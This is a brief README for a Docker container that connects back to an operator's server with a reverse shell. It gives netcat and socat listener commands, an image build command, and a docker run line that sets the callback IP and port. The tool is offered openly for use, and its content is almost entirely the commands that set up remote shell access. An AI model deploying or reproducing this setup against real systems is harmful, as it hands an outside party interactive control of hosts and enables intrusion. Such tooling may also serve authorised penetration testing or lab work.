# Reverse Shell Container

Run a container which connects back to a server with a reverse shell.

## Usage of the remote shell container

Follow these steps to connect back to a shell from within a container.

### Start the server

The reverse shell in the container will connect back to your server. Open up a
port with the following snippet:

```bash
nc -lvvp 6666
# OR
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### optional: Build the image

```bash
docker build -t reverse_shell:latest .
```

### Execute the image

Run the reverse shell container with:
`docker run --rm -it -e IP=192.168.178.26 -e PORT=6666 reverse_shell`
